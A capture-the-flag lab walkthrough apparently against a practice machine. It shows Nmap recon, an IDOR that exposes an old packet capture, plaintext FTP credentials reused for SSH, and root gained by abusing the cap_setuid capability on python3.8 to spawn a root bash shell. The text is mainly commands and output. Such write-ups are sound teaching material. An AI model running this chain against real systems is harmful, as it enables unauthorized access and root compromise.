1. Reconnaissance & Port Scanning

An initial Nmap scan of the target host identified three active listening services:

nmap 10.129.92.33
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http

Service breakdown:

  • Port 21 (FTP): File Transfer Protocol service.
  • Port 22 (SSH): OpenSSH server running on Ubuntu Linux.
  • Port 80 (HTTP): Web server hosting an administrative dashboard.

2. Web Application Enumeration & IDOR

Browsing to http://10.129.92.33/ loaded a web portal titled Security Dashboard, logged in under the user account Nathan.

Navigating to the Security Snapshot feature triggered a network capture routine that redirected the client to:

http://10.129.92.33/data/1

The snapshot page listed packet metrics (Packet count, IP Packets, TCP Packets, UDP Packets) and provided a Download button delivering a .pcap file.

Testing for an Insecure Direct Object Reference (IDOR) by modifying the index ID to 0:

http://10.129.92.33/data/0

The application returned an earlier capture file (0.pcap) recorded across the host's network interfaces.

3. Credential Harvesting (PCAP Analysis)

Downloading and inspecting 0.pcap revealed unencrypted FTP traffic communicating across the local network interface. Reviewing the plain-text application protocol stream identified authentication exchanges for the user nathan:

USER nathan
PASS [REDACTED_CREDENTIALS]

4. Initial Foothold & User Flag

With SSH open on port 22 and valid credentials harvested from the FTP session, remote access was obtained via SSH:

ssh nathan@10.129.92.33

Verifying the session privileges and reading the user flag from Nathan's home directory:

nathan@cap:~$ id
uid=1001(nathan) gid=1001(nathan) groups=1001(nathan)

nathan@cap:~$ ls -la
-rw-r----- 1 nathan nathan   33 May 15  2021 user.txt

nathan@cap:~$ cat user.txt
[REDACTED_USER_FLAG]

5. Privilege Escalation via Linux Capabilities

Auditing the host for executables configured with extended Linux capabilities:

getcap -r / 2>/dev/null

The search discovered that the Python 3.8 binary held the cap_setuid capability:

/usr/bin/python3.8 = cap_setuid+ep

The cap_setuid capability allows the process to arbitrarily manipulate its effective and real User ID (UID) without requiring the binary to be setuid-root.

Spawning an interactive Python shell and invoking os.setuid(0) escalated the process to root privileges:

nathan@cap:~$ python3.8
Python 3.8.5 (default, Jan 27 2021, 15:41:15) 
[GCC 9.3.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> import os
>>> os.setuid(0)
>>> os.system("/bin/bash")

root@cap:~# id
uid=0(root) gid=1001(nathan) groups=1001(nathan)

root@cap:~# cd /root
root@cap:/root# ls
root.txt  snap

root@cap:/root# cat root.txt
[REDACTED_ROOT_FLAG]
